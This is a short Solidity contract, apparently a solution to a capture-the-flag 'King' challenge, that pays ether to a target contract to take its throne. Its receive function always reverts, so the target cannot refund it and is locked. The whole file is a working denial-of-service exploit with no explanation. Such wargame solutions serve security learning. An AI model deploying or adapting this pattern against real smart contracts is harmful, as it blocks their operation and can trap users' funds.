// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address payable kingContract;

    constructor(address _kingContract) payable {
        kingContract = payable(_kingContract);
    }

    receive() external payable {
        revert();
    }

    function Attack() external {
        (bool success, ) = kingContract.call{value: 0.01 ether}("");
        require(success);
    }
}
